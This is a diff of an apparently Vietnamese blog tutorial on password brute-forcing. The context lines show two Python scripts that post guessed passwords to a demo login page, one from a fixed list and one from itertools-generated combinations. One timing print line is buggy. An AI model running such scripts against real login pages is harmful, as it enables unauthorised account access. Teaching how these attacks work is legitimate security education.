@@ -49,7 +49,7 @@ Password: 123demo => Wrong password!
 
 Python:
 
-~~~python
+{% highlight python linenos %}
 import requests
 pwlist = ['demo', '123', '1234', '123456', 'test', 'demo1', 'demo123', '123demo']
 url = 'http://tqk.itps.com.vn/demo.php'
@@ -58,7 +58,7 @@ for password in pwlist:
   req = requests.post(url, data=payload)
   if('talent' in req.text):
     print('Password found:', password)
-~~~
+{% endhighlight %}
 
 
 ````
@@ -72,7 +72,7 @@ Việc tấn công có hay không sử dụng từ điển đều được hoạ
 
 Xem ví dụ sau, ở đây tôi sử dụng itertools trong python để generate wordlist:
 
-~~~python
+{% highlight python linenos %}
 import requests
 import itertools
 import time
@@ -90,7 +90,7 @@ for i in res:
         print('\nTaken %s seconds to crack very easy password' %time.time() - start_time)
     else:
         print('Failed.....')
-~~~
+{% endhighlight %}
 
 Và khi tôi chạy đoạn code này, với một máy tính "bình dân" của tôi, ước tính phải mất đến hơn 3 năm để có thể duyệt hết được số lượng hơn 2 tỉ mật khẩu đơn giản có độ dài 7 kí tự chỉ bao gồm chữ cái thường và chữ số. ( Ở đây tôi không đề cập đến việc perfomance, multithreading, đường truyền, sử dụng GPU và một số vấn đề khác). Một con số đáng kể.
 
